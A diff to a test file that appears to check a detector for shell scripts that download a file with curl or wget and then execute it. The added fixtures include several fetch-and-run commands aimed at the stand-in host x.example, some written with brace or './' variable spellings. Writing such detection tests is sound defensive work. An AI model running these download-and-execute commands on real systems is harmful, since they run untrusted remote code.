@@ -21,6 +21,11 @@ test("a destination held in a variable links the download to the run", () => {
     '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSL -o "$OUT" https://x.example/y.sh\nsh "$OUT"\n',
     "#!/bin/sh\nOUT=/tmp/y.sh\ncurl --output=$OUT https://x.example/y.sh\n. $OUT\n",
     '#!/bin/sh\nBIN=/tmp/b\nwget -qO "$BIN" https://x.example/b\nsh "$BIN"\n',
+    // The brace spelling and a `./` prefix still name the same variable.
+    `#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "\${OUT}" https://x.example/y.sh\nbash "\${OUT}"\n`,
+    '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSL -o "$OUT" https://x.example/y.sh\nsh ./$OUT\n',
+    `#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "$OUT" https://x.example/y.sh\n. "./\${OUT}"\n`,
+    `#!/bin/sh\nBIN=/tmp/b\nwget -qO "\${BIN}" https://x.example/b\nsh "./\${BIN}"\n`,
   ])
     expect({ text, categories: categories(text) }).toEqual({
       text,
@@ -42,6 +47,8 @@ test("a different variable, a bare name and a log flag stay clean", () => {
     '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "$OUT" https://x.example/y.sh\nbash OUT\n',
     // `wget -o` names the log, not the download.
     '#!/bin/sh\nLOG=/tmp/log\nwget -o "$LOG" https://x.example/b\nsh "$LOG"\n',
+    // The prefix does not rescue a different variable.
+    '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "$OUT" https://x.example/y.sh\nbash "./$OTHER"\n',
   ])
     expect({ text, categories: categories(text) }).toEqual({
       text,
